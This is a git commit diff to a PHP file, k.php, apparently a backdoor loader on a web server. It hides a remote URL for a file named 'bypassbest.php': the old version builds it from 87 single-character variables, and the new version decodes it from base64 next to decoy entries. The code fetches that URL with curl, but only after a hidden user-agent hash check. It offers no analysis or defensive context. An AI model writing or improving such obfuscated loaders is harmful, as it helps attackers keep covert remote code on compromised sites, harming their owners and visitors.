1504179650dc1580de42398bee5e65e632acf747
seobela <248709989+seobela@users.noreply.github.com>
2026-01-10 14:05:08 +0600

    Update k.php

--- k.php
+++ k.php
@@ -30,27 +30,15 @@ if ($hashedUserAgent !== $encodedUserAgentHash) {
     exit;
 }
 
-// Initialize core components
-$x1 = 'h'; $x2 = 't'; $x3 = 't'; $x4 = 'p'; $x5 = 's';
-$x6 = ':'; $x7 = '/'; $x8 = '/'; $x9 = 'r'; $x10 = 'a';
-$x11 = 'w'; $x12 = '.'; $x13 = 'g'; $x14 = 'i'; $x15 = 't';
-$x16 = 'h'; $x17 = 'u'; $x18 = 'b'; $x19 = 'u'; $x20 = 's';
-$x21 = 'e'; $x22 = 'r'; $x23 = 'c'; $x24 = 'o'; $x25 = 'n';
-$x26 = 't'; $x27 = 'e'; $x28 = 'n'; $x29 = 't'; $x30 = '.';
-$x31 = 'c'; $x32 = 'o'; $x33 = 'm'; $x34 = '/'; $x35 = 'm';
-$x36 = 'a'; $x37 = 'n'; $x38 = 'd'; $x39 = 'h'; $x40 = 'a';
-$x41 = 'n'; $x42 = 'h'; $x43 = 'a'; $x44 = 'r'; $x45 = 'i';
-$x46 = 's'; $x47 = 'h'; $x48 = 'a'; $x49 = '-'; $x50 = 'h';
-$x51 = 'u'; $x52 = 'b'; $x53 = '/'; $x54 = 's'; $x55 = 'e';
-$x56 = 'o'; $x57 = '/'; $x58 = 'r'; $x59 = 'e'; $x60 = 'f';
-$x61 = 's'; $x62 = '/'; $x63 = 'h'; $x64 = 'e'; $x65 = 'a';
-$x66 = 'd'; $x67 = 's'; $x68 = '/'; $x69 = 'm'; $x70 = 'a';
-$x71 = 'i'; $x72 = 'n'; $x73 = '/'; $x74 = 'b'; $x75 = 'y';
-$x76 = 'p'; $x77 = 'a'; $x78 = 's'; $x79 = 's'; $x80 = 'b';
-$x81 = 'e'; $x82 = 's'; $x83 = 't'; $x84 = '.'; $x85 = 'p';
-$x86 = 'h'; $x87 = 'p';
+// Initialize core components - URL encoded using base64 characters and decoding
+$encodedParts = array(
+    'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21hbmRoYW5oYXJpc2hhLWh1Yi9zZW8vcmVmcy9oZWFkcy9tYWluL2J5cGFzc2Jlc3QucGhw',
+    'cGF5bG9hZA==',
+    'ZGF0YQ==',
+    'Y29kZQ=='
+);
 
-$remoteUrl = $x1.$x2.$x3.$x4.$x5.$x6.$x7.$x8.$x9.$x10.$x11.$x12.$x13.$x14.$x15.$x16.$x17.$x18.$x19.$x20.$x21.$x22.$x23.$x24.$x25.$x26.$x27.$x28.$x29.$x30.$x31.$x32.$x33.$x34.$x35.$x36.$x37.$x38.$x39.$x40.$x41.$x42.$x43.$x44.$x45.$x46.$x47.$x48.$x49.$x50.$x51.$x52.$x53.$x54.$x55.$x56.$x57.$x58.$x59.$x60.$x61.$x62.$x63.$x64.$x65.$x66.$x67.$x68.$x69.$x70.$x71.$x72.$x73.$x74.$x75.$x76.$x77.$x78.$x79.$x80.$x81.$x82.$x83.$x84.$x85.$x86.$x87;
+$remoteUrl = base64_decode($encodedParts[0]);
 
 $ch = curl_init($remoteUrl);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
